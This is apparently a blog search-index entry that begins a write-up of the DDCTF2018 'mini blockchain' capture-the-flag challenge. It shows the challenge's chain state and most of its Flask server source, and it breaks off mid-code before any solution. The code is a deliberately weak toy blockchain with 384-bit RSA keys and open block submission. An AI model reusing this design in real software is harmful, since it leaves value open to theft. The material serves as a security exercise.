<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>DDCTF2018ï¼šmini blockchain</title>
      <link href="2021/11/01/ddctf2018-mini-blockchain/"/>
      <url>2021/11/01/ddctf2018-mini-blockchain/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/11/01/ddctf2018-mini-blockchain/image-20211101145544001.png" alt="image-20211101145544001"></p><pre><code>Announcement: The server has been restarted at 21:45 04/17. All blockchain have been reset. View source codehash of genesis block: 3eac8fa8280955626ceb82ade9b07250e77518e9ba2c4736af4f299ec00dd962the bank's addr: b780aa1fba896158371edc45168f681608ae1315f9a2de3e3c9d85489c36bb22dbd8efcd9473e8fa5c4250d3df4f125b, the hacker's addr: a7b568edbcc8a9c395555642bdff0fcaf3772e50f6565264ab661f2e23b5bcb361501713fc9ab1d81197893502055a4b, the shop's addr: d2510c299359754f6a2c86069a674538f265c1c3c6808c8da0b751f427ffe6291073ddf0a220f4954b358bd9c52a0071Balance of all addresses: {"d2510c299359754f6a2c86069a674538f265c1c3c6808c8da0b751f427ffe6291073ddf0a220f4954b358bd9c52a0071": 0, "b780aa1fba896158371edc45168f681608ae1315f9a2de3e3c9d85489c36bb22dbd8efcd9473e8fa5c4250d3df4f125b": 0, "a7b568edbcc8a9c395555642bdff0fcaf3772e50f6565264ab661f2e23b5bcb361501713fc9ab1d81197893502055a4b": 0, "8c0fb4f8d1af7953b2c31449a1791781e91f1ad26255e19706810ff0d61717c0e6d4264dd2307a5aba1ddcd92f48c1e7": 999999, "8393de0e73705cb1aa4121db3c629c06cd8ca6d55bdca622e2d6cce3ab3b053b1b6ab969adc0be73f7a302e9378ad8b7": 1}All utxos: {"621d14eb-8be4-4a1a-aeba-3abc077b9892": {"amount": 1, "hash": "8aca42fcc869e9bc9910cf1c762c533ff7ef688cce362eb0e0abcad5ac686bc5", "addr": "8393de0e73705cb1aa4121db3c629c06cd8ca6d55bdca622e2d6cce3ab3b053b1b6ab969adc0be73f7a302e9378ad8b7", "id": "621d14eb-8be4-4a1a-aeba-3abc077b9892"}, "375c1f2b-58b9-4282-a3bd-8e9b7591b236": {"amount": 999999, "hash": "0ede005c512d4d8cca71ed0bc32733472b5bf4128ce4812e5f4b31be1f345a64", "addr": "8c0fb4f8d1af7953b2c31449a1791781e91f1ad26255e19706810ff0d61717c0e6d4264dd2307a5aba1ddcd92f48c1e7", "id": "375c1f2b-58b9-4282-a3bd-8e9b7591b236"}}Blockchain Explorer: {"108248f604c2b0ba842c9bc897e1adecf27c6e66a92d243b57f1805ddd9fe369": {"nonce": "HAHA, I AM THE BANK NOW!", "prev": "3eac8fa8280955626ceb82ade9b07250e77518e9ba2c4736af4f299ec00dd962", "hash": "108248f604c2b0ba842c9bc897e1adecf27c6e66a92d243b57f1805ddd9fe369", "transactions": [{"input": ["845e6673-ad33-4645-97f6-ef4f8895e82c"], "signature": ["0f808f1d3b6016c2f5a06e00602c3d4ffaac76efb04eb97f8ff9f76ed745b58f357ad7dab38d33bc7229f7b1df158034"], "hash": "7ce1d7a76757c181593b3e02433b24d05d86133ca0c9c5bcb46371e3846f0fbe", "output": [{"amount": 999999, "hash": "0ede005c512d4d8cca71ed0bc32733472b5bf4128ce4812e5f4b31be1f345a64", "addr": "8c0fb4f8d1af7953b2c31449a1791781e91f1ad26255e19706810ff0d61717c0e6d4264dd2307a5aba1ddcd92f48c1e7", "id": "375c1f2b-58b9-4282-a3bd-8e9b7591b236"}, {"amount": 1, "hash": "8aca42fcc869e9bc9910cf1c762c533ff7ef688cce362eb0e0abcad5ac686bc5", "addr": "8393de0e73705cb1aa4121db3c629c06cd8ca6d55bdca622e2d6cce3ab3b053b1b6ab969adc0be73f7a302e9378ad8b7", "id": "621d14eb-8be4-4a1a-aeba-3abc077b9892"}]}], "height": 1}, "e92b1df81deac2217847b89de1d38e4b06c19d58aa95a5fed6413c629c2eb616": {"nonce": "a empty block", "prev": "108248f604c2b0ba842c9bc897e1adecf27c6e66a92d243b57f1805ddd9fe369", "hash": "e92b1df81deac2217847b89de1d38e4b06c19d58aa95a5fed6413c629c2eb616", "transactions": [], "height": 2}, "3eac8fa8280955626ceb82ade9b07250e77518e9ba2c4736af4f299ec00dd962": {"nonce": "The Times 03/Jan/2009 Chancellor on brink of second bailout for bank", "prev": "0000000000000000000000000000000000000000000000000000000000000000", "hash": "3eac8fa8280955626ceb82ade9b07250e77518e9ba2c4736af4f299ec00dd962", "transactions": [{"input": [], "signature": [], "hash": "c3a654c05dc934708f962d78dd795768132256a7d64c866439975a43024e15ec", "output": [{"amount": 1000000, "hash": "8cb6994bbb901d94bda4388669f42c65a08685526e977d2a09ae69568d590aca", "addr": "8393de0e73705cb1aa4121db3c629c06cd8ca6d55bdca622e2d6cce3ab3b053b1b6ab969adc0be73f7a302e9378ad8b7", "id": "845e6673-ad33-4645-97f6-ef4f8895e82c"}]}], "height": 0}}</code></pre><p>iew source_code:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- encoding: utf-8 -*-</span><span class="token comment" spellcheck="true"># written in python 2.7</span>__author__ <span class="token operator">=</span> <span class="token string">'garzon'</span><span class="token keyword">import</span> hashlib<span class="token punctuation">,</span> json<span class="token punctuation">,</span> rsa<span class="token punctuation">,</span> uuid<span class="token punctuation">,</span> os<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> escape<span class="token punctuation">,</span> request<span class="token keyword">from</span> pycallgraph <span class="token keyword">import</span> PyCallGraph  <span class="token keyword">from</span> pycallgraph <span class="token keyword">import</span> Config  <span class="token keyword">from</span> pycallgraph<span class="token punctuation">.</span>output <span class="token keyword">import</span> GraphvizOutput app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'*********************'</span>url_prefix <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">def</span> <span class="token function">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Here is your flag: DDCTF{******************}'</span><span class="token keyword">def</span> <span class="token function">hash</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hash_reducer</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> hash<span class="token punctuation">(</span>hash<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">+</span>hash<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">has_attrs</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> attrs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> type<span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Input should be a dict/JSON"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> attr <span class="token keyword">in</span> attrs<span class="token punctuation">:</span>        <span class="token keyword">if</span> attr <span class="token operator">not</span> <span class="token keyword">in</span> d<span class="token punctuation">:</span>            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"{} should be presented in the input"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>attr<span class="token punctuation">)</span><span class="token punctuation">)</span>EMPTY_HASH <span class="token operator">=</span> <span class="token string">'0'</span><span class="token operator">*</span><span class="token number">64</span><span class="token keyword">def</span> <span class="token function">addr_to_pubkey</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> rsa<span class="token punctuation">.</span>PublicKey<span class="token punctuation">(</span>int<span class="token punctuation">(</span>address<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">65537</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pubkey_to_address</span><span class="token punctuation">(</span>pubkey<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">assert</span> pubkey<span class="token punctuation">.</span>e <span class="token operator">==</span> <span class="token number">65537</span>    hexed <span class="token operator">=</span> hex<span class="token punctuation">(</span>pubkey<span class="token punctuation">.</span>n<span class="token punctuation">)</span>    <span class="token keyword">if</span> hexed<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> hexed <span class="token operator">=</span> hexed<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> hexed<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> hexed <span class="token operator">=</span> hexed<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> hexed<span class="token keyword">def</span> <span class="token function">gen_addr_key_pair</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    pubkey<span class="token punctuation">,</span> privkey <span class="token operator">=</span> rsa<span class="token punctuation">.</span>newkeys<span class="token punctuation">(</span><span class="token number">384</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> pubkey_to_address<span class="token punctuation">(</span>pubkey<span class="token punctuation">)</span><span class="token punctuation">,</span> privkeybank_address<span class="token punctuation">,</span> bank_privkey <span class="token operator">=</span> gen_addr_key_pair<span class="token punctuation">(</span><span class="token punctuation">)</span>hacker_address<span class="token punctuation">,</span> hacker_privkey <span class="token operator">=</span> gen_addr_key_pair<span class="token punctuation">(</span><span class="token punctuation">)</span>shop_address<span class="token punctuation">,</span> shop_privkey <span class="token operator">=</span> gen_addr_key_pair<span class="token punctuation">(</span><span class="token punctuation">)</span>shop_wallet_address<span class="token punctuation">,</span> shop_wallet_privkey <span class="token operator">=</span> gen_addr_key_pair<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">sign_input_utxo</span><span class="token punctuation">(</span>input_utxo_id<span class="token punctuation">,</span> privkey<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> rsa<span class="token punctuation">.</span>sign<span class="token punctuation">(</span>input_utxo_id<span class="token punctuation">,</span> privkey<span class="token punctuation">,</span> <span class="token string">'SHA-1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hash_utxo</span><span class="token punctuation">(</span>utxo<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> <span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create_output_utxo</span><span class="token punctuation">(</span>addr_to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">:</span>    utxo <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> str<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'addr'</span><span class="token punctuation">:</span> addr_to<span class="token punctuation">,</span> <span class="token string">'amount'</span><span class="token punctuation">:</span> amount<span class="token punctuation">}</span>    utxo<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hash_utxo<span class="token punctuation">(</span>utxo<span class="token punctuation">)</span>    <span class="token keyword">return</span> utxo<span class="token keyword">def</span> <span class="token function">hash_tx</span><span class="token punctuation">(</span>tx<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> <span class="token punctuation">[</span>        reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> EMPTY_HASH<span class="token punctuation">)</span><span class="token punctuation">,</span>        reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> <span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token keyword">for</span> utxo <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'output'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> EMPTY_HASH<span class="token punctuation">)</span>    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create_tx</span><span class="token punctuation">(</span>input_utxo_ids<span class="token punctuation">,</span> output_utxo<span class="token punctuation">,</span> privkey_from<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>    tx <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'input'</span><span class="token punctuation">:</span> input_utxo_ids<span class="token punctuation">,</span> <span class="token string">'signature'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>sign_input_utxo<span class="token punctuation">(</span>id<span class="token punctuation">,</span> privkey_from<span class="token punctuation">)</span> <span class="token keyword">for</span> id <span class="token keyword">in</span> input_utxo_ids<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'output'</span><span class="token punctuation">:</span> output_utxo<span class="token punctuation">}</span>    tx<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hash_tx<span class="token punctuation">(</span>tx<span class="token punctuation">)</span>    <span class="token keyword">return</span> tx<span class="token keyword">def</span> <span class="token function">hash_block</span><span class="token punctuation">(</span>block<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> <span class="token punctuation">[</span>block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> block<span class="token punctuation">[</span><span class="token string">'nonce'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> <span class="token punctuation">[</span>tx<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token keyword">for</span> tx <span class="token keyword">in</span> block<span class="token punctuation">[</span><span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> EMPTY_HASH<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create_block</span><span class="token punctuation">(</span>prev_block_hash<span class="token punctuation">,</span> nonce_str<span class="token punctuation">,</span> transactions<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> type<span class="token punctuation">(</span>prev_block_hash<span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'prev_block_hash should be hex-encoded hash value'</span><span class="token punctuation">)</span>    nonce <span class="token operator">=</span> str<span class="token punctuation">(</span>nonce_str<span class="token punctuation">)</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>nonce<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">128</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'the nonce is too long'</span><span class="token punctuation">)</span>    block <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'prev'</span><span class="token punctuation">:</span> prev_block_hash<span class="token punctuation">,</span> <span class="token string">'nonce'</span><span class="token punctuation">:</span> nonce<span class="token punctuation">,</span> <span class="token string">'transactions'</span><span class="token punctuation">:</span> transactions<span class="token punctuation">}</span>    block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hash_block<span class="token punctuation">(</span>block<span class="token punctuation">)</span>    <span class="token keyword">return</span> block<span class="token keyword">def</span> <span class="token function">find_blockchain_tail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> max<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> block<span class="token punctuation">:</span> block<span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">calculate_utxo</span><span class="token punctuation">(</span>blockchain_tail<span class="token punctuation">)</span><span class="token punctuation">:</span>    curr_block <span class="token operator">=</span> blockchain_tail    blockchain <span class="token operator">=</span> <span class="token punctuation">[</span>curr_block<span class="token punctuation">]</span>    <span class="token keyword">while</span> curr_block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> session<span class="token punctuation">[</span><span class="token string">'genesis_block_hash'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        curr_block <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>curr_block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        blockchain<span class="token punctuation">.</span>append<span class="token punctuation">(</span>curr_block<span class="token punctuation">)</span>    blockchain <span class="token operator">=</span> blockchain<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    utxos <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">for</span> block <span class="token keyword">in</span> blockchain<span class="token punctuation">:</span>        <span class="token keyword">for</span> tx <span class="token keyword">in</span> block<span class="token punctuation">[</span><span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> input_utxo_id <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                <span class="token keyword">del</span> utxos<span class="token punctuation">[</span>input_utxo_id<span class="token punctuation">]</span>            <span class="token keyword">for</span> utxo <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'output'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                utxos<span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> utxo    <span class="token keyword">return</span> utxos<span class="token keyword">def</span> <span class="token function">calculate_balance</span><span class="token punctuation">(</span>utxos<span class="token punctuation">)</span><span class="token punctuation">:</span>    balance <span class="token operator">=</span> <span class="token punctuation">{</span>bank_address<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> hacker_address<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> shop_address<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">}</span>    <span class="token keyword">for</span> utxo <span class="token keyword">in</span> utxos<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span> <span class="token operator">not</span> <span class="token keyword">in</span> balance<span class="token punctuation">:</span>            balance<span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>        balance<span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+=</span> utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> balance<span class="token keyword">def</span> <span class="token function">verify_utxo_signature</span><span class="token punctuation">(</span>address<span class="token punctuation">,</span> utxo_id<span class="token punctuation">,</span> signature<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> rsa<span class="token punctuation">.</span>verify<span class="token punctuation">(</span>utxo_id<span class="token punctuation">,</span> signature<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> addr_to_pubkey<span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">append_block</span><span class="token punctuation">(</span>block<span class="token punctuation">,</span> difficulty<span class="token operator">=</span>int<span class="token punctuation">(</span><span class="token string">'f'</span><span class="token operator">*</span><span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    has_attrs<span class="token punctuation">(</span>block<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">,</span> <span class="token string">'nonce'</span><span class="token punctuation">,</span> <span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> type<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span> <span class="token operator">=</span> str<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> type<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'nonce'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> block<span class="token punctuation">[</span><span class="token string">'nonce'</span><span class="token punctuation">]</span> <span class="token operator">=</span> str<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'nonce'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span> <span class="token operator">not</span> <span class="token keyword">in</span> session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown parent block"</span><span class="token punctuation">)</span>    tail <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    utxos <span class="token operator">=</span> calculate_utxo<span class="token punctuation">(</span>tail<span class="token punctuation">)</span>    <span class="token keyword">if</span> type<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Please put a transaction array in the block'</span><span class="token punctuation">)</span>    new_utxo_ids <span class="token operator">=</span> set<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> tx <span class="token keyword">in</span> block<span class="token punctuation">[</span><span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        has_attrs<span class="token punctuation">(</span>tx<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token string">'output'</span><span class="token punctuation">,</span> <span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> utxo <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'output'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            has_attrs<span class="token punctuation">(</span>utxo<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">,</span> <span class="token string">'addr'</span><span class="token punctuation">,</span> <span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> str<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span> <span class="token operator">=</span> str<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown type of id of output utxo"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token keyword">in</span> new_utxo_ids<span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"output utxo of same id({}) already exists."</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            new_utxo_ids<span class="token punctuation">.</span>add<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown type of amount of output utxo"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"invalid amount of output utxo"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown type of address of output utxo"</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                addr_to_pubkey<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"invalid type of address({})"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>utxo<span class="token 